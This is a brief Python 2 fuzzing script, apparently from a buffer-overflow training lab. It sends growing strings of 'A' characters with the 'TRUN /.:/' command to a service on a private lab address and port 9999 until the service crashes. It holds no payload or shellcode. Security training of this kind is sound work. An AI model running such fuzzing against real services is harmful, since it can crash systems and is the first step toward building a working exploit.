#!/usr/bin/python
import sys, socket
from time import sleep

ip = "10.21.1.15"
port = 9999

buffer = "A" * 100

while True: 
    try:
        print "[+] Sending buffer of %s bytes" % str(len(buffer))
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip, port))
        s.recv(1024)
        s.send(('TRUN /.:/' + buffer))
        s.close()

        sleep(1)
        buffer = buffer + "A" * 100

    except: 
        print "[-] Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()
